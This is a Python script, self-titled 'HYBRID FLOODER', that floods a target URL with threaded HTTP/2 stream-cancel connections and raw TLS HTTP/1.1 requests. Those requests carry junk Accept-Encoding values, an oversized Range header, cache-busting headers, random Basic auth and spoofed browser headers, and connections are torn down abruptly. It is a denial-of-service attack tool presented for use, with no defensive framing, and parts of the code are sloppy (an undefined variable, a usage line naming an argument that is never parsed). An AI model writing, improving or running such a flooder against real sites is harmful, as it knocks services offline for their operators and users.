import threading, sys, random,socket,ssl,struct, base64
from MODEL.data import get_target, generate_url_path

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.errors import ErrorCodes
from h2.events import RequestReceived

def keep_sending(sock,p):
    try:
        for _ in range(250):
            sock.sendall(p[0]); sock.sendall(p[1])
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except:
        pass

def h2_con(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        conn = H2Connection(config=H2Configuration(client_side=True))
        conn.initiate_connection()
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, [(":method", meth), (":scheme", "https"), (":authority", target['host']), (":path", target['uri'])], end_stream=True)
        s.sendall(conn.data_to_send())
        while True:
            data = s.recv(65536)
            if not data:break

            events = conn.receive_data(data)
            for event in events:
                if isinstance(event, RequestReceived):
                    conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)

                s.sendall(conn.data_to_send())
    except:pass

def connect(target, meth):
    try:
       path = 1
       for _ in range(250):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        threading.Thread(target=keep_sending,args=(s,[f"{meth} {a} HTTP/1.1\r\nHost: {target['host']}\r\nX-HTTP-Method-Override: POST\r\nAuthorization: Basic {base64.b64encode(f'{generate_url_path(1)}:{generate_url_path(1)}'.encode()).decode()}\r\nRange: bytes=18-18446744073709551615\r\nAccept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA, BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, OOOAOAOOOAOOAOOOAOOOAOOOAOO, ****************************stupiD, doar-e, ftw, imo, *, ,\r\nCache-Control: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\npragma: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\nCloudflare-CDN-Cache-Control: max-age=24400\r\nCDN-Cache-Control: max-age=18000\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]])).start()
        path += 1
    except:pass

url = ''; meth = ''; thread = 0

if len(sys.argv) == 4:
    url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:
    print(f'WELCOME TO HYBRID FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
for _ in range(thread):
        threading.Thread(target=h2_con,args=(target,)).start()
        threading.Thread(target=connect, args=(target, meth)).start()